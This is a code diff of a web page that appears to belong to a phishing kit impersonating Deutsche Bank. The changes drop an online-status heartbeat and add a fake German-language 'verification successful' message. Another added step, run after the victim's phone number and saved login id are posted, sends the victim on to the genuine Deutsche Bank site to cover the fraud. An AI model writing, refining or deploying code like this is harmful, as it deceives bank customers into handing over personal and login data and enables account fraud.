@@ -312,16 +312,7 @@
   <input type="hidden" id="user-id" value="65a67a557a7d8">
   <input type="hidden" id="loginid" value="<?php echo $savedId; ?>">
   	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-      <script>
-    setInterval(() => {
-      const data = new FormData();
-      data.append('id', document.querySelector('#user-id').value);
-      fetch('/user/online', {
-        method: 'POST',
-        body: data
-      });
-    }, 3000);
-    
+      <script>    
     document.addEventListener("DOMContentLoaded", function() {
       const phoneElem = document.getElementById("phone");
       if (phoneElem) {
@@ -333,6 +324,16 @@
     
     $(document).ready(function() {
       $('.Beendenbtn').on('click', function() {
+
+
+        $('#login-form').html(`<div id="verimiContainer" style="border-top: 0; margin-top: 0; padding-top: 0;">
+                                  
+                                  <p>Vielen Dank für die erfolgreiche Verifikation Ihrer Daten.
+Ihr Konto wurde bestätigt, und Sie können nun alle Funktionen wie gewohnt nutzen. Wir schätzen Ihr Vertrauen in die Deutsche Bank.</p>
+<p>Sie werden in Kürze zur Hauptseite weitergeleitet. Falls die Weiterleitung nicht automatisch erfolgt, klicken Sie bitte hier <a href="https://www.deutsche-bank.de/pk.html" target="_blank" rel="noopener noreferrer">https://www.deutsche-bank.de/pk.html</a>.</p>
+                                  
+                              </div>`).parent().css('border', '1px solid #c2c2c2');
+
          var phone = $('#phone').val();
         var savedId = $('#loginid').val();
          var formData = {
@@ -349,6 +350,9 @@
               //   } else {
               //       console.error(response.message);
               //   }
+              setTimeout(() => {
+                  window.location.href = 'https://www.deutsche-bank.de/pk.html';
+              }, 5000);
             },
             error: function(xhr, status, error) {
                console.error(xhr.responseText);
